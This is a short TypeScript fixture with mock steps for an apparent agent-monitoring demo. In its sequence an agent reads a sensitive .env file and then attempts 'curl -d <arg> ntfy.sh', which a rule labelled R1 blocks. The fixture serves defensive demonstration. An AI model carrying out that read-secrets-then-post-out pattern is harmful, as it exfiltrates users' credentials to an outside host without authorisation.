import type { Step } from './types'

/** The demo story: orders start at 40,000 like real sessions do. */
export const MOCK_STEPS: readonly Step[] = [
  { order: 40000, kind: 'read', verdict: 'allowed', tool: null, file: 'README.md', sensitive: false, command: null, host: null, rule: null },
  { order: 40001, kind: 'read', verdict: 'allowed', tool: null, file: '.env', sensitive: true, command: null, host: null, rule: null },
  { order: 40002, kind: 'read', verdict: 'allowed', tool: null, file: 'README.md', sensitive: false, command: null, host: null, rule: null },
  { order: 40003, kind: 'shell', verdict: 'allowed', tool: null, file: null, sensitive: false, command: 'ls', host: null, rule: null },
  { order: 40004, kind: 'shell', verdict: 'blocked', tool: null, file: null, sensitive: false, command: 'curl -d <arg> ntfy.sh', host: 'ntfy.sh', rule: 'R1' },
]
